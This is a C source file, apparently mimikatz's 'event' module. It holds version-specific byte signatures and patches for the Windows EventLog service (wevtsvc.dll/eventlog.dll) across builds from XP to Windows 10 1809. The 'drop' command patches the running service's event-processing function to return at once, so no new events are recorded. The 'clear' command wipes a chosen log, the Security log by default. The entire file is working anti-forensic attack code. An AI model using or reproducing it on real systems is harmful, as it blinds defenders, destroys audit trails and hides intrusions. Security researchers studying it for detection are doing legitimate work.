/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_event.h"

const KUHL_M_C kuhl_m_c_event[] = {
	{kuhl_m_event_drop,		L"drop",	L"[experimental] patch Events service to avoid new events"},
	{kuhl_m_event_clear,	L"clear",	L"Clear an event log"},
};
const KUHL_M kuhl_m_event = {
	L"event", L"Event module", NULL,
	ARRAYSIZE(kuhl_m_c_event), kuhl_m_c_event, NULL, NULL
};

#ifdef _M_X64
BYTE PTRN_WNT5_PerformWriteRequest[]			= {0x49, 0x89, 0x5b, 0x10, 0x49, 0x89, 0x73, 0x18};
BYTE PTRN_WN60_Channel__ActualProcessEvent[]	= {0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0x48, 0x8b, 0xda, 0xe8};
BYTE PTRN_WIN6_Channel__ActualProcessEvent[]	= {0xff, 0xf7, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};
BYTE PTRN_WI10_Channel__ActualProcessEvent[]	= {0x48, 0x8b, 0xc4, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x40, 0xc8, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x58, 0x08};
BYTE PTRN_WN10_1607_Channel__ActualProcessEvent[]	= {0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};
BYTE PTRN_WN10_1709_Channel__ActualProcessEvent[]	= {0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xca, 0xe8};
BYTE PTRN_WN10_1803_Channel__ActualProcessEvent[]	= {0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x89, 0x6c, 0x24, 0x58, 0x48, 0x89, 0x74, 0x24, 0x60};
BYTE PTRN_WN10_1809_Channel__ActualProcessEvent[]	= {0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x89, 0x74, 0x24, 0x58, 0x49, 0x8b, 0xf0, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xca, 0xe8};

BYTE PATC_WNT6_Channel__ActualProcessEvent[]	= {0xc3};
BYTE PATC_WNT5_PerformWriteRequest[]			= {0x45, 0x33, 0xed, 0xc3};

KULL_M_PATCH_GENERIC EventReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WNT5_PerformWriteRequest),			PTRN_WNT5_PerformWriteRequest},			{sizeof(PATC_WNT5_PerformWriteRequest),			PATC_WNT5_PerformWriteRequest},			{-10}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Channel__ActualProcessEvent),	PTRN_WN60_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_Channel__ActualProcessEvent),	PTRN_WIN6_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI10_Channel__ActualProcessEvent),	PTRN_WI10_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_Channel__ActualProcessEvent),	PTRN_WN10_1607_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WN10_1709_Channel__ActualProcessEvent),	PTRN_WN10_1709_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_Channel__ActualProcessEvent),	PTRN_WN10_1803_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_Channel__ActualProcessEvent),	PTRN_WN10_1809_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
};
#elif defined _M_IX86
BYTE PTRN_WNT5_PerformWriteRequest[]			= {0x89, 0x45, 0xe4, 0x8b, 0x7d, 0x08, 0x89, 0x7d};
BYTE PTRN_WN60_Channel__ActualProcessEvent[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x56, 0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};
BYTE PTRN_WN61_Channel__ActualProcessEvent[]	= {0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};
BYTE PTRN_WN62_Channel__ActualProcessEvent[]	= {0x33, 0xc4, 0x50, 0x8d, 0x44, 0x24, 0x28, 0x64, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x75, 0x0c};
BYTE PTRN_WN63_Channel__ActualProcessEvent[]	= {0x33, 0xc4, 0x50, 0x8d, 0x44, 0x24, 0x20, 0x64, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x8b, 0xf9, 0x8b};
BYTE PTRN_WN64_Channel__ActualProcessEvent[]	= {0x33, 0xc4, 0x89, 0x44, 0x24, 0x10, 0x53, 0x56, 0x57, 0xa1};
BYTE PTRN_WN10_1607_Channel__ActualProcessEvent[]	= {0x8b, 0xd9, 0x8b, 0x4d, 0x08, 0xe8};
BYTE PTRN_WN10_1709_Channel__ActualProcessEvent[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x0c, 0x56, 0x57, 0x8b, 0xf9, 0x8b, 0x4d, 0x08, 0xe8};
BYTE PTRN_WN10_1803_Channel__ActualProcessEvent[]	= {0x8b, 0xf1, 0x89, 0x75, 0xec, 0x8b, 0x7d, 0x08, 0x8b, 0xcf, 0xe8};
BYTE PTRN_WN10_1809_Channel__ActualProcessEvent[]	= {0x8b, 0xf1, 0x89, 0x75, 0xf0, 0x8b, 0x7d, 0x08, 0x8b, 0xcf, 0xe8};

BYTE PATC_WNT5_PerformWriteRequest[]			= {0x33, 0xc0, 0xc2, 0x04, 0x00};
BYTE PATC_WNO8_Channel__ActualProcessEvent[]	= {0xc2, 0x04, 0x00};
BYTE PATC_WIN8_Channel__ActualProcessEvent[]	= {0xc2, 0x08, 0x00};
BYTE PATC_W1803_Channel__ActualProcessEvent[]	= {0xc2, 0x0c, 0x00};

KULL_M_PATCH_GENERIC EventReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WNT5_PerformWriteRequest),			PTRN_WNT5_PerformWriteRequest},			{sizeof(PATC_WNT5_PerformWriteRequest),			PATC_WNT5_PerformWriteRequest},			{-20}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Channel__ActualProcessEvent),	PTRN_WN60_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {  0}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_Channel__ActualProcessEvent),	PTRN_WN61_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-12}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN62_Channel__ActualProcessEvent),	PTRN_WN62_Channel__ActualProcessEvent},	{sizeof(PATC_WIN8_Channel__ActualProcessEvent), PATC_WIN8_Channel__ActualProcessEvent}, {-33}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_Channel__ActualProcessEvent),	PTRN_WN63_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-32}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN64_Channel__ActualProcessEvent),	PTRN_WN64_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-30}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_Channel__ActualProcessEvent),	PTRN_WN10_1607_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-12}},
	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WN10_1709_Channel__ActualProcessEvent),	PTRN_WN10_1709_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {  0}},
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_Channel__ActualProcessEvent),	PTRN_WN10_1803_Channel__ActualProcessEvent},	{sizeof(PATC_W1803_Channel__ActualProcessEvent), PATC_W1803_Channel__ActualProcessEvent}, {-12}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_Channel__ActualProcessEvent),	PTRN_WN10_1809_Channel__ActualProcessEvent},	{sizeof(PATC_W1803_Channel__ActualProcessEvent), PATC_W1803_Channel__ActualProcessEvent}, {-12}},
};
#endif

NTSTATUS kuhl_m_event_drop(int argc, wchar_t * argv[])
{
	kull_m_patch_genericProcessOrServiceFromBuild(EventReferences, ARRAYSIZE(EventReferences), L"EventLog", (MIMIKATZ_NT_MAJOR_VERSION < 6) ? L"eventlog.dll" : L"wevtsvc.dll", TRUE);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_event_clear(int argc, wchar_t * argv[])
{
	HANDLE hEventLog;
	PCWCHAR szLog;
	DWORD nbEvents;
	kull_m_string_args_byName(argc, argv, L"log", &szLog, L"Security");

	kprintf(L"Using \"%s\" event log :\n", szLog);
	if(hEventLog = OpenEventLog(NULL, szLog))
	{
		if(GetNumberOfEventLogRecords(hEventLog, &nbEvents))
			kprintf(L"- %u event(s)\n", nbEvents);
		if(ClearEventLog(hEventLog, NULL))
			kprintf(L"- Cleared !\n");
		else PRINT_ERROR_AUTO(L"ClearEventLog");
		if(GetNumberOfEventLogRecords(hEventLog, &nbEvents))
			kprintf(L"- %u event(s)\n", nbEvents);
	}
	else PRINT_ERROR_AUTO(L"OpenEventLog");

	return STATUS_SUCCESS;
}